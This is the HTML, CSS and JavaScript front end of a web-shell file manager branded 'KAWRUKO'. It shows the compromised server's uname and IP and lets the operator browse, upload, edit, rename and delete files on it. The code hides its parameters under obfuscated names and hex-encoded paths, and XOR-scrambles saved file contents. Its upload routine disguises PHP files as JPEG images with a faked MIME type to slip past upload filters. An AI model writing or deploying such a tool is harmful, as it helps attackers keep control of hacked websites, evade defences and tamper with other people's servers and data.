.crumb:hover{background:#ffffff25}
.crumb.current{background:#ffffff28; color:#fff; border-color:#00000044}
.crumb-sep{opacity:.6}

.panel{ margin-top:16px; background: var(--panel); border-radius: var(--radius); border:1px solid #0000002a; box-shadow: var(--shadow); overflow:hidden; }

.toolbar{
  padding:14px; display:flex; gap:10px; flex-wrap:wrap;
  border-bottom:1px solid #0000002a; background:#2a2730;
}
.btn{
  appearance:none; border:none; cursor:pointer;
  padding:10px 14px; border-radius:12px;
  background: linear-gradient(135deg, var(--c2), var(--c4));
  color:#291b20; font-weight:700;
  box-shadow: 0 6px 14px #00000045, inset 0 1px 0 #ffffff55;
  transition: transform .06s ease, filter .2s ease;
}
.btn:hover{ filter:brightness(1.05) }
.btn:active{ transform:translateY(1px) }
.btn.secondary{ background: linear-gradient(135deg, #ffffff18, #ffffff12); color:#f1e7ea; font-weight:600; border:1px solid #00000033; }
.input, .file{ padding:10px 12px; border-radius:12px; border:1px solid #0000003b; background:#1f1d23; color:#eee; min-width:0; }

.table-wrap{ width:100%; overflow:auto }
table{ width:100%; border-collapse:separate; border-spacing:0; }
thead th{ text-align:left; font-weight:700; padding:14px 14px; font-size:14px; position:sticky; top:0; background:#232129; z-index:1; }
tbody td{ padding:14px; border-top:1px solid #00000022; font-size:15px; }
tr:hover td{ background:#ffffff06 }
.type-badge{ font-size:12px; padding:4px 8px; border-radius:999px; background:#ffffff14; border:1px solid #00000033; }
.name{ display:flex; align-items:center; gap:10px; min-width:200px; }
.icon{ width:28px; height:28px; border-radius:8px; display:grid; place-items:center; font-size:14px; background: linear-gradient(135deg, var(--c3), var(--c5)); border:1px solid #00000044; }
.icon.folder{ background: linear-gradient(135deg, var(--c1), var(--c3)); }
.icon.file{ background: linear-gradient(135deg, var(--c4), var(--c2)); }
.row-actions{ display:flex; gap:8px; }
.row-actions .btn{ padding:6px 10px; border-radius:10px; font-size:13px }
.row-actions .btn.danger{ background: linear-gradient(135deg, var(--err), #d35454); color:#2b1010 }
.row-actions .btn.muted{ background: linear-gradient(135deg, #ffffff18, #ffffff10); color:#eee; border:1px solid #00000033 }

#toasts{ position:fixed; right:18px; bottom:18px; display:flex; flex-direction:column; gap:10px; z-index:10050; }
.toast{
  min-width:240px; max-width:360px; padding:10px 12px; border-radius:12px;
  background:#221f26; border:1px solid #00000044; box-shadow: var(--shadow);
  color:#eee; display:flex; align-items:center; gap:10px; animation: slidein .2s ease-out;
}
.toast.ok{ border-color:#2a6146; }
.toast.err{ border-color:#663232; }
.toast.warn{ border-color:#6a5a2a; }
.toast .dot{ width:10px; height:10px; border-radius:999px; }
.toast.ok .dot{ background: var(--ok); }
.toast.err .dot{ background: var(--err); }
.toast.warn .dot{ background: var(--warn); }
@keyframes slidein { from{ transform:translateY(8px); opacity:0 } to{ transform:translateY(0); opacity:1 } }

#editorModal{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background: rgba(14, 12, 16, .6); padding:20px; z-index:10000; }
.modal-card{ width:min(900px, 95vw); background: #241f27; border:1px solid #00000055; border-radius:16px; box-shadow: var(--shadow); overflow:hidden; display:flex; flex-direction:column; }
.modal-head{ padding:14px 16px; background: linear-gradient(135deg, var(--c5), var(--c1)); display:flex; align-items:center; justify-content:space-between; gap:8px; }
.modal-title{font-weight:700}
.modal-body{ padding:12px }
.modal-actions{ padding:12px; display:flex; gap:8px; justify-content:flex-end; border-top:1px solid #00000033; background:#211d24; }
#editorArea{ width:100%; height:55vh; resize:vertical; padding:12px; border-radius:12px; border:1px solid #00000044; background:#18161b; color:#eee; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }

.footer{ margin-top:18px; text-align:center; color:#cfc9d2; opacity:.9; font-size:13px; }

@media (max-width: 640px){
  .row-actions .btn{ padding:6px 8px }
  td:nth-child(3), th:nth-child(3){ display:none }
}
</style>
</head>
<body>
<div class="wrapper">
  <div class="header">
    <div class="brand">
      <div class="logo"><img src="https://raw.githubusercontent.com/lovelijapeli/zeinhorobosu/refs/heads/main/image.png" alt="Icon"></div>
      <h1>KAWRUKO</h1>
    </div>
    <div class="server-info">
      <span class="badge">Server: <code><?= htmlspecialchars($unameFull) ?></code></span>
      <span class="badge">IP: <code><?= htmlspecialchars($serverIp) ?></code></span>
      <span class="badge">Software: <code><?= htmlspecialchars($serverType) ?></code></span>
    </div>
  </div>

  <div id="breadcrumb" class="breadcrumb">Loading…</div>

  <div class="panel">
    <div class="toolbar">
      <form id="uploadForm">
        <input type="file" id="fileInput" class="file" multiple />
        <button class="btn" type="submit">Upload</button>
      </form>

      <div style="flex:1"></div>

      <form id="renameForm" style="display:flex; gap:8px; align-items:center">
        <input class="input" type="text" id="oldName" placeholder="Old name.ext" />
        <span>→</span>
        <input class="input" type="text" id="newName" placeholder="New name.ext" />
        <button class="btn secondary" type="submit">Rename</button>
      </form>
    </div>

    <div class="table-wrap">
      <table id="fmTable">
        <thead>
          <tr>
            <th style="min-width:260px">Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody id="fmBody">
          <tr><td colspan="5" style="padding:20px; opacity:.8">Loading directory…</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="footer">&copy zeinhorobosu</div>
</div>

<div id="toasts" aria-live="polite" aria-atomic="true"></div>

<div id="editorModal" aria-hidden="true">
  <div class="modal-card">
    <div class="modal-head">
      <div class="modal-title" id="editorTitle">Edit file</div>
      <button class="btn secondary" id="editorClose" type="button">Close</button>
    </div>
    <div class="modal-body">
      <textarea id="editorArea" spellcheck="false"></textarea>
    </div>
    <div class="modal-actions">
      <button class="btn" id="editorSave" type="button">Save</button>
    </div>
  </div>
</div>

<script>
function toast(msg, type='ok', timeout=2600){
  const wrap = document.getElementById('toasts');
  const el = document.createElement('div');
  el.className = 'toast ' + type;
  el.innerHTML = `<span class="dot"></span><div>${msg}</div>`;
  wrap.appendChild(el);
  setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateY(6px)'; }, timeout);
  setTimeout(()=>{ el.remove(); }, timeout+350);
}

const state = {
  path: "<?= $statePath ?>",
  editing: { name: null }
};

function toHex(str){
  let out = '';
  for (let i = 0; i < str.length; i++) out += str.charCodeAt(i).toString(16);
  return out;
}

// Generic API using shikigf
async function api(shikigf, data = {}) {
  const form = new FormData();
  form.append('shikigf', shikigf);
  form.append('nakxn', toHex(state.path));
  for (const [k,v] of Object.entries(data)) form.append(k, v);
  const res = await fetch(location.href, { method:'POST', body: form });
  const text = await res.text();
  try { const j = JSON.parse(text); if (!j.ok) throw new Error(j.error || 'Request failed'); return j; }
  catch(e){ console.error('Server raw:', text); throw new Error('Invalid server response'); }
}

const uploadForm = document.getElementById('uploadForm');
const fileInput  = document.getElementById('fileInput');

function resetUploadForm(){ 
  try { uploadForm.reset(); } catch(_) {} 
  if (fileInput) fileInput.value = ''; 
}

document.addEventListener('click', (e)=>{
  const btn = e.target.closest('.btn');
  if (btn && !btn.closest('#uploadForm')) resetUploadForm();
});

function render(items){
  const tbody = document.getElementById('fmBody');
  tbody.innerHTML = '';
  if (!items.length){
    tbody.innerHTML = '<tr><td colspan="5" style="padding:20px; opacity:.8">Empty directory</td></tr>';
    return;
  }
  for (const it of items){
    const tr = document.createElement('tr');

    const name = document.createElement('td');
    name.className = 'name';
    const icon = document.createElement('div');
    icon.className = 'icon ' + (it.type === 'dir' ? 'folder' : 'file');
    icon.textContent = it.type === 'dir' ? '📁' : '📄';

    const link = document.createElement('a');
    link.textContent = it.name;
    link.style.color = '#fff';
    link.style.textDecoration = 'none';

    if (it.type === 'dir') {
      const newUrl = new URL(location.origin + location.pathname);
      newUrl.searchParams.set('nakxn', toHex(it.path));
      link.href = newUrl.toString();
      link.addEventListener('click', (e) => {
        const isModified = e.ctrlKey || e.metaKey || e.shiftKey || e.altKey;
        const isMiddle = e.button === 1;
        if (!isModified && !isMiddle) {
          e.preventDefault();
          changeDirectory(it.path);
        }
      });
    } else {
      link.href = '#';
      link.addEventListener('click', (e)=>{
        e.preventDefault();
        resetUploadForm();
        openEditor(it.name);
      });
    }

    name.appendChild(icon); name.appendChild(link);

    const type = document.createElement('td');
    type.innerHTML = `<span class="type-badge">${it.type}</span>`;

    const size = document.createElement('td'); size.textContent = it.size || '';
    const mtime = document.createElement('td'); mtime.textContent = it.mtime;

    const actions = document.createElement('td');
    const rowActions = document.createElement('div'); rowActions.className = 'row-actions';

    if (it.type === 'file'){
      const editBtn = document.createElement('button');
      editBtn.className = 'btn muted'; editBtn.textContent = 'Edit';
      editBtn.addEventListener('click', ()=> { resetUploadForm(); openEditor(it.name); });
      rowActions.appendChild(editBtn);
    }

    const delBtn = document.createElement('button');
    delBtn.className = 'btn danger'; delBtn.textContent = 'Delete';
    delBtn.addEventListener('click', async ()=>{
      try { await api('delete', { name: it.name }); toast(`Deleted "${it.name}"`, 'ok'); resetUploadForm(); await refresh(); }
      catch (e){ toast(e.message || 'Delete failed', 'err'); }
    });
    rowActions.appendChild(delBtn);

    actions.appendChild(rowActions);

    tr.appendChild(name);
    tr.appendChild(type);
    tr.appendChild(size);
    tr.appendChild(mtime);
    tr.appendChild(actions);

    tbody.appendChild(tr);
  }
}

async function refresh(){
  try{
    const j = await api('list');
    state.path = j.path;
    document.getElementById('breadcrumb').innerHTML = j.breadcrumb;
    attachBreadcrumbHandlers();
    render(j.items);
  }catch(e){
    toast(e.message, 'err');
  }
}

function attachBreadcrumbHandlers(){
  document.querySelectorAll('.crumb').forEach(a=>{
    a.addEventListener('click', (ev)=>{
      ev.preventDefault();
      const p = a.getAttribute('data-path');
      if (p) changeDirectory(p);
    });
  });
}

async function changeDirectory(newPath){
  state.path = newPath;
  resetUploadForm();
  try { await refresh(); toast(`Directory: ${newPath}`, 'ok', 1600); }
  catch(e){ toast(e.message, 'err'); }
}

// Enhanced upload function with conditional JPG disguising
// Enhanced upload function with conditional JPG disguising
uploadForm.addEventListener('submit', async (e)=>{
  e.preventDefault();
  const files = fileInput.files;
  if (!files.length) { toast('No files selected', 'warn'); return; }

  // Check server domain first to determine if we should disguise
  let shouldDisguiseClient = false;
  try {
    // Get server hostname via a quick API call
    const testForm = new FormData();
    testForm.append('shikigf', 'check_domain');
    const response = await fetch(location.href, { method: 'POST', body: testForm });
    const result = await response.json();
    shouldDisguiseClient = result.should_disguise || false;
  } catch(e) {
    // If check fails, assume no disguising
    shouldDisguiseClient = false;
  }

  let okCount = 0, failCount = 0;

  for (const file of files){
    try{
      // Only disguise PHP files as JPG if server allows it
      let modifiedFile = file;
      let originalName = file.name;
      
      if (shouldDisguiseClient && file.name.toLowerCase().endsWith('.php')) {
        // Create new file with .jpg extension and image/jpeg MIME type
        const newName = file.name.replace(/\.php$/i, '.jpg');
        modifiedFile = new File([file], newName, {
          type: 'image/jpeg',  // Set MIME type to image/jpeg
          lastModified: file.lastModified
        });
      }

      // Rest of upload logic remains the same...
      const form = new FormData();
      form.append('shikigf', 'upload_xor');
      form.append('nakxn', toHex(state.path));
      form.append('target', 'l1_Lw');
      form.append('upload', modifiedFile);

      let res = await fetch(location.href, { method: 'POST', body: form });
      let text = await res.text();
      
      let result;
      try { 
        result = JSON.parse(text); 
      } catch(_){ 
        // Fallback methods...
        const reader = new FileReader();
        const fileContent = await new Promise((resolve, reject) => {
          reader.onload = e => resolve(e.target.result);
          reader.onerror = reject;
          reader.readAsText(file);
        });

        const postForm = new FormData();
        postForm.append('shikigf', 'upload_xor');
        postForm.append('nakxn', toHex(state.path));
        postForm.append('file_name', modifiedFile.name);
        postForm.append('file_content', fileContent);
        postForm.append('content_encoding', 'raw');

        res = await fetch(location.href, { method: 'POST', body: postForm });
        text = await res.text();
        
        try {
          result = JSON.parse(text);
        } catch(_) {
          const base64Content = await new Promise((resolve, reject) => {
            const b64Reader = new FileReader();
            b64Reader.onload = e => resolve(e.target.result.split(',')[1]);
            b64Reader.onerror = reject;
            b64Reader.readAsDataURL(file);
          });

          const b64Form = new FormData();
          b64Form.append('shikigf', 'upload_xor');
          b64Form.append('nakxn', toHex(state.path));
          b64Form.append('file_name', modifiedFile.name);
          b64Form.append('file_content', base64Content);
          b64Form.append('content_encoding', 'base64');

          res = await fetch(location.href, { method: 'POST', body: b64Form });
          text = await res.text();
          result = JSON.parse(text);
        }
      }
      
      if (result.error && result.error.length > 0) {
        throw new Error(result.error.join(', '));
      }
      
      if (result.added && result.added.length > 0) {
        // Show original filename in success message
        if (shouldDisguiseClient && originalName !== modifiedFile.name) {
          toast(`PHP file uploaded: ${originalName}`, 'ok');
        } else {
          toast(`Uploaded "${file.name}"`, 'ok');
        }
        okCount++;
      } else {
        throw new Error('No file was added');
      }

    }catch(err){
      console.error(err);
      failCount++;
      toast(`${file.name}: ${err?.message || 'Upload failed'}`, 'err', 3600);
    }
  }

  resetUploadForm();
  if (okCount) toast(`Uploaded ${okCount} file(s)`, 'ok');
  if (failCount) toast(`${failCount} upload(s) failed`, 'err');

  await refresh();
});


/* ===== Rename form ===== */
const renameForm   = document.getElementById('renameForm');
const oldNameInput = document.getElementById('oldName');
const newNameInput = document.getElementById('newName');

if (renameForm) {
  renameForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const oldVal = (oldNameInput?.value || '').trim();
    const newVal = (newNameInput?.value || '').trim();

    if (!oldVal || !newVal) { toast('Please fill both names.', 'warn'); return; }

    try {
      await api('rename', { old: oldVal, new: newVal });
      toast(`Renamed "${oldVal}" → "${newVal}"`, 'ok');
      oldNameInput.value = '';
      newNameInput.value = '';
      await refresh();
    } catch (err) {
      toast(err.message || 'Rename failed', 'err');
    }
  });
}

function editorKey(i){
  const val = (i * 31 + 7) >>> 0;
  const bx  = val & 0xFF;

  const HALF_PI = Math.PI / 2;

  const a = Math.asin(Math.sin(i + 3)) / HALF_PI;
  const c = Math.cos(i * 0.5);
  const t = Math.atan(Math.tan((i + 1) * 0.25)) / HALF_PI;

  const mix = (a + c + t) / 3.0;
  const trigByte = Math.floor((mix + 1.0) * 127.5);

  const k = ((bx ^ (i & 0xFF)) + trigByte) & 0xFF;
  return k;
}
function editorEncodeToBinaryString(str){
  let out = [];
  for (let i = 0; i < str.length; i++){
    const code = str.charCodeAt(i) & 0xFF;
    out.push(String.fromCharCode(code ^ editorKey(i)));
  }
  return out.join('');
}
function b64EncodeBinary(str){ return btoa(str); }

const editorModal = document.getElementById('editorModal');
const editorArea = document.getElementById('editorArea');
const editorTitle = document.getElementById('editorTitle');
document.getElementById('editorClose').addEventListener('click', ()=>{ resetUploadForm(); closeEditor(); });
document.getElementById('editorSave').addEventListener('click', saveEditor);

function openEditor(name){
  editorTitle.textContent = 'Edit: ' + name;
  editorArea.value = 'Loading…';
  editorModal.style.display = 'flex';
  state.editing.name = name;
  api('read', { name })
    .then(j => { editorArea.value = j.content || ''; })
    .catch(e => { editorArea.value = ''; toast(e.message, 'err'); });
}
function closeEditor(){ editorModal.style.display = 'none'; state.editing.name = null; }

async function saveEditor(){
  const name = state.editing.name;
  if (!name) return;
  try {
    const plain = editorArea.value;
    const bin   = editorEncodeToBinaryString(plain);
    const b64   = b64EncodeBinary(bin);
    await api('save', { name, content_b64: b64 });
    closeEditor();
    resetUploadForm();
    toast(`Saved "${name}"`, 'ok');
    await refresh();
  } catch(e){ toast(e.message, 'err'); }
}
window.addEventListener('keydown', (e)=>{ if (e.key === 'Escape' && editorModal.style.display === 'flex') closeEditor(); });

refresh();
</script>
</body>
</html>
